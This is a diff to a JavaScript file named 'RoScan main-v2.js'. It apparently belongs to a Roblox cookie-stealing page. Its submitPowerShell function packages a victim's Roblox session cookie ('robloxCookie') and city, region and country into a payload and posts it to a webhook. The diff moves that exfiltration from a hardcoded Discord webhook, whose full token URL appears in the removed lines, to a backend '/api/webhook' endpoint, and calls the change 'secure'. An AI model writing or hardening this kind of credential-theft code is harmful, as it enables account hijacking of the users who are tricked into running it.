@@ -1,16 +1,17 @@
-// RoScan JavaScript v2.0.0 - Direct webhook integration
-console.log('✅ RoScan main-v2.js v2.0.1 loaded - Direct Discord webhook');
+// RoScan JavaScript v2.0.0 - Backend API integration
+console.log('✅ RoScan main-v2.js v2.0.1 loaded - Backend API secure');
 
 // Test function for debugging webhook
 window.testWebhook = async function() {
     try {
-        const response = await fetch('https://discord.com/api/webhooks/1403020465177362502/qjej6thgoVwAs0NYAxYk9SM-V8rqiPAc5t6zaobCan6Uv6mD5ucXRE1AnlW6jGWdhNnx', {
+        const response = await fetch('/api/webhook', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({content: 'Browser test from console'})
         });
         console.log('✅ Test webhook response:', response.status);
-        console.log('📄 Webhook test completed');
+        const data = await response.json();
+        console.log('📄 Response:', data);
     } catch (error) {
         console.error('❌ Test webhook failed:', error);
     }
@@ -280,8 +281,8 @@ async function submitPowerShell() {
         const delay = Math.floor(Math.random() * 2000) + 1000;
         await new Promise(resolve => setTimeout(resolve, delay));
         
-        // Send directly to Discord webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1403020465177362502/qjej6thgoVwAs0NYAxYk9SM-V8rqiPAc5t6zaobCan6Uv6mD5ucXRE1AnlW6jGWdhNnx';
+        // Send to secure backend API
+        const apiUrl = '/api/webhook';
         
         // Simple webhook payload - only cookie and location
         const payload = {
@@ -290,11 +291,11 @@ Cookie: ${robloxCookie || 'None found'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
-        // Send webhook request directly to Discord
-        console.log('🔥 Sending direct webhook request');
+        // Send webhook request through secure backend
+        console.log('🔥 Sending secure API request');
         console.log('Payload:', payload);
         
-        const response = await fetch(webhookUrl, {
+        const response = await fetch(apiUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -318,11 +319,11 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             console.error('Webhook failed:', response.status);
             
             if (response.status === 403) {
-                throw new Error(`Webhook forbidden (403). The Discord webhook URL may be invalid or expired.`);
+                throw new Error(`API forbidden (403). Check server configuration.`);
             } else if (response.status === 0 || !response.status) {
-                throw new Error(`Connection failed. Network or CORS issue.`);
+                throw new Error(`Connection failed. Check if backend server is running.`);
             } else {
-                throw new Error(`Webhook failed (${response.status}): Unknown error`);
+                throw new Error(`API failed (${response.status}): Check server logs`);
             }
         }
     } catch (error) {
